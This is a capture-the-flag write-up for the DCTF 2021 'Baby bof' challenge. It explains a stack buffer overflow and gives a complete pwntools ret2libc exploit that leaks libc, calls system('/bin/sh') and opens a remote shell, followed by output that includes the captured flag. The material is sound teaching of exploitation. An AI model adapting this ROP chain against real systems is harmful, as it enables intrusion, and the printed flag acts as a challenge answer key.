# DCTF 2021

## Baby bof

> 250
> 
> It's just another bof. 
> 
> `nc dctf-chall-baby-bof.westeurope.azurecontainer.io 7481`
>
> [hotel\_rop](hotel_rop) [Dockerfile](Dockerfile)

Tags: _pwn_ _x86-64_ _bof_ _rop_ _ret2libc_


## Summary

Classic two-pass leak libc, return to vuln, get a shell.


## Analysis

### Checksec

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
```

Partial RELRO--GOT overwrite; no canary--BOF/ROP; no PIE--easy ROP.


### Decompile with Ghidra

```c
void vuln(void)
{
  char local_12 [10];
  
  puts("plz don\'t rop me");
  fgets(local_12,0x100,stdin);
  puts("i don\'t think this will work");
  return;
}
```

Write out `0x12` of garbage to get to return address in stack and start ROP.

> The libc version was provided in the form of a `Dockerfile`.  I've included it (`libc.so.6`) as part of this writeup since a future update to Ubuntu 20.04 may change the version of libc.


## Exploit

```python
#!/usr/bin/env python3

from pwn import *

binary = context.binary = ELF('./baby_bof')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

if args.REMOTE:
    p = remote('dctf-chall-baby-bof.westeurope.azurecontainer.io', 7481)
    libc = ELF('./libc.so.6')
else:
    p = process(binary.path)
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

pop_rdi = next(binary.search(asm('pop rdi; ret')))

payload  = b''
payload += 0x12 * b'A'
payload += p64(pop_rdi)
payload += p64(binary.got.puts)
payload += p64(binary.plt.puts)
payload += p64(binary.sym.vuln)

p.sendlineafter('me\n',payload)
p.recvuntil('work\n')

puts = u64(p.recv(6) + b'\0\0')
log.info('puts: ' + hex(puts))
libc.address = puts - libc.sym.puts
log.info('libc.address: ' + hex(libc.address))

payload  = 0x12 * b'A'
payload += p64(pop_rdi + 1)
payload += p64(pop_rdi)
payload += p64(libc.search(b'/bin/sh').__next__())
payload += p64(libc.sym.system)

p.sendlineafter('me\n',payload)
p.recvuntil('work\n')
p.interactive()
```

If this does not make sense, then click [here](https://github.com/datajerk/ctf-write-ups/blob/master/INDEX.md), scroll down to ROP, and start reading, perhaps start [here](https://github.com/datajerk/ctf-write-ups/blob/master/darkctf2020/roprop) or [here](https://github.com/datajerk/ctf-write-ups/tree/master/downunderctf2020/return_to_what) for nearly identical examples.

Output:

```bash
# ./exploit.py REMOTE=1
[*] '/pwd/datajerk/dctf2021/baby_bof/baby_bof'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Opening connection to dctf-chall-baby-bof.westeurope.azurecontainer.io on port 7481: Done
[*] '/lib/x86_64-linux-gnu/libc.so.6'
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
[*] puts: 0x7f0d964c25a0
[*] libc.address: 0x7f0d9643b000
[*] Switching to interactive mode
$ cat flag.txt
dctf{D0_y0U_H4v3_A_T3mpl4t3_f0R_tH3s3}
```
